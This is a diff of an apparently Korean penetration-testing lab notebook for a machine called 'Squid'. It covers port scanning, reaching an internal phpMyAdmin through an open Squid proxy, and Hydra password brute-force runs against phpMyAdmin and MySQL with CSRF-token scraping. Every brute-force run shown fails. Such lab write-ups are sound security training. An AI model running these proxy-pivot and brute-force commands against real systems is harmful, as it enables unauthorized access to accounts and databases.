@@ -1,3 +1,5 @@
+# Squid
+
 ```bash
 docker cp universal.ovpn kali:/
 
@@ -12,6 +14,8 @@ ip a | grep tun
 
 # 192.168.199.189
 ```
+
+## 1. 스캔
 
 ```text
 ┌──(root㉿docker-desktop)-[/]
@@ -52,6 +56,8 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 236.62 seconds
 ```
 
+## 2. SMB
+
 - smbclient
 
 ```text
@@ -65,6 +71,8 @@ session setup failed: NT_STATUS_ACCESS_DENIED
 ```
 
 - smbclient 445 anonymous blocked
+
+## 3. Squid
 
 ```bash
 http http://192.168.199.189:3128
@@ -245,6 +253,8 @@ Released for free under a Creative Commons Attribution 2.5 License
 </body></html>
 ```
 
+## 4. proxychains
+
 - /etc/proxychains.cfg 변경
 
 ```text
@@ -388,9 +398,12 @@ Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-19 08:56 +0000
 http: error: ConnectionError: HTTPConnectionPool(host='127.0.0.1', port=80): Max retries exceeded with url: / (Caused by NewConnectionError("HTTPConnection(host='127.0.0.1', port=80): Failed to establish a new connection: [Errno 111] Connection refused")) while doing a GET request to URL: http://127.0.0.1:80/
 ```
 
+## 5. 내부 웹
+
 - CURL 활용해서 접근
 - curl -x http://192.168.199.189:3128 http://127.0.0.1:8080
 
+```text
 ┌──(root㉿docker-desktop)-[/]
 └─# curl -x http://192.168.199.189:3128 http://127.0.0.1:8080
 <!DOCTYPE html>
@@ -530,7 +543,9 @@ if (select.addEventListener) {
 </script>
 </body>
 </html>
+```
 
+```text
 curl -x http://192.168.199.189:3128 http://127.0.0.1:8080/phpmyadmin
 
 ┌──(root㉿docker-desktop)-[/]
@@ -544,9 +559,11 @@ curl -x http://192.168.199.189:3128 http://127.0.0.1:8080/phpmyadmin
 <hr>
 <address>Apache/2.4.46 (Win64) PHP/7.3.21 Server at 127.0.0.1 Port 8080</address>
 </body></html>
+```
 
 - curl -x http://192.168.199.189:3128 http://127.0.0.1:8080/phpmyadmin/
 
+```text
 ┌──(root㉿docker-desktop)-[/]
 └─# curl -x http://192.168.199.189:3128 http://127.0.0.1:8080/phpmyadmin/
 <!doctype html>
@@ -865,18 +882,29 @@ $(function() {
   </div>
   </body>
 </html>
+```
 
 - form 확인 결과 index.php 로그인 목적지 확인
 
-# hydra
+## 6. Hydra
 
+```bash
 hydra -l root -P /usr/share/wo
+```
 
+```bash
 HYDRA_PROXY=http://192.168.199.189:3128 hydra -L users.txt -P passes.txt -s 8080 127.0.0.1 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=TOKEN:F=Access denied" -t 4 -f -V
+```
 
-DB 직접 브루트포스 (토큰 없음, 더 안정 — 추천)
+### 6-1. DB 직접 (실패)
+
+DB 직접 브루트포스 -> 실패
+
+```bash
 HYDRA_PROXY=http://192.168.199.189:3128 hydra -l root -P passes.txt -s 3307 127.0.0.1 mysql -t 4 -f -V
+```
 
+```text
 ┌──(root㉿docker-desktop)-[/]
 └─# HYDRA_PROXY=http://192.168.199.189:3128 hydra -l root -P passes.txt -s 3307 127.0.0.1 mysql -t 4 -f -V
 Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -884,12 +912,19 @@ Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in mi
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-19 09:33:49
 [WARNING] module mysql does not support HYDRA_PROXY* !
 [ERROR] File for passwords not found: passes.txt
+```
+
+- hydra MYSQL 모듈을 지원하지 않으므로 접기
+- 추후 python custom try
 
 Most-Popular-Letter-Passes.txt
 /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt
 
+```bash
 HYDRA_PROXY=http://192.168.199.189:3128 hydra -l root -P /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt -s 3307 127.0.0.1 mysql -t 4 -f -V
+```
 
+```text
 ┌──(root㉿docker-desktop)-[/usr/share/wordlists/seclists/Passwords]
 └─# HYDRA_PROXY=http://192.168.199.189:3128 hydra -l root -P /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt -s 3307 127.0.0.1 mysql -t 4 -f -V
 Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -899,9 +934,13 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-19 09:35:
 [INFO] Using Connect Proxy: http://192.168.199.189:3128
 [WARNING] http:// is an invalid type, must be connect://, socks4:// or socks5:// if you use HYDRA_PROXY, entry ignored
 [ERROR] proxy defined but not valid, exiting
+```
 
+```bash
 HYDRA_PROXY=http://192.168.199.189:3128 hydra -l root -P /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt -s 8080 127.0.0.1 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=TOKEN:F=Access denied" -t 4 -f -V
+```
 
+```text
 ┌──(root㉿docker-desktop)-[/usr/share/wordlists/seclists/Passwords]
 └─# HYDRA_PROXY=http://192.168.199.189:3128 hydra -l root -P /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt -s 8080 127.0.0.1 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=TOKEN:F=Access denied" -t 4 -f -V
 Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -910,9 +949,15 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-19 09:36:
 [INFO] Using Connect Proxy: http://192.168.199.189:3128
 [WARNING] http:// is an invalid type, must be connect://, socks4:// or socks5:// if you use HYDRA_PROXY, entry ignored
 [ERROR] proxy defined but not valid, exiting
+```
 
-- /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt
+- http 지원 안 한다고 경고
+- password
+  /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt
+- username
+  /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
 
+```text
 ┌──(root㉿docker-desktop)-[/]
 └─# proxychains4 -q hydra -l root -P /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt -s 3307 127.0.0.1 mysql -t 4 -f -V
 Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -924,7 +969,9 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-19 09:39:
 [ATTEMPT] target 127.0.0.1 - login "root" - pass "'buster+'" - 2 of 47603 [child 1] (0/0)
 [ATTEMPT] target 127.0.0.1 - login "root" - pass "++++" - 3 of 47603 [child 2] (0/0)
 [ATTEMPT] target 127.0.0.1 - login "root" - pass "+monday" - 4 of 47603 [child 3] (0/0)
+```
 
+```text
 ┌──(root㉿docker-desktop)-[/]
 └─# proxychains4 -q hydra -l root -P /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt -s 3307 127.0.0.1 mysql -t 4 -f -V
 Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -943,19 +990,26 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-19 09:39:
 [ERROR] all children were disabled due too many connection errors
 0 of 1 target completed, 0 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-19 09:39:51
+```
 
-2. 토큰 확보
+## 7. 토큰 확보
+
+```bash
    TOKEN=$(curl -s -x http://192.168.199.189:3128 http://127.0.0.1:8080/phpmyadmin/index.php | grep -oP 'name="token" value="\K[^"]+'); echo "token=$TOKEN"
+```
 
+```text
 ┌──(root㉿docker-desktop)-[/usr/share/wordlists/seclists/Usernames]
 └─# TOKEN=$(curl -s -x http://192.168.199.189:3128 http://127.0.0.1:8080/phpmyadmin/index.php | grep -oP 'name="token" value="\K[^"]+'); echo "token=$TOKEN"
 token=3f6459722c632d2b667b365b454e6f78
 3f6459722c632d2b667b365b454e6f7
+```
 
-3. hydra 교차 브루트포스 실행
+## 8. 교차 브루트포스
 
 - /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
 
+```text
 ┌──(root㉿docker-desktop)-[/usr/share/wordlists/seclists/Usernames]
 └─# proxychains4 hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt -s 8080 127.0.0.1 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=$TOKEN:F=Access denied:C=/phpmyadmin/index.php" -t 4 -f -V
 [proxychains] config file found: /etc/proxychains4.conf
@@ -967,11 +1021,16 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-19 09:49:
 [DATA] max 4 tasks per 1 server, overall 4 tasks, 809251 login tries (l:17/p:47603), ~202313 tries per task
 [DATA] attacking http-post-form://127.0.0.1:8080/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=:F=Access denied:C=/phpmyadmin/index.php
 [ERROR] no valid optional parameter type given: F
+```
 
 ---
 
+```bash
 proxychains4 hydra -L top-usernames-shortlist.txt -P ../Passwords/Most-Popular-Letter-Passes.txt -s 8080 127.0.0.1 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=$T:C=/phpmyadmin/index.php:2=:F=CSRF" -t 4 -f -V
 216a2f757c755648564f4c6478424b54 216a2f757c755648564f4c6478424b54
+```
+
+```text
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 [proxychains] DLL init: proxychains-ng 4.17
@@ -1000,3 +1059,4 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-19 09:57:
 [ERROR] all children were disabled due too many connection errors
 0 of 1 target completed, 0 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-19 09:57:58
+```
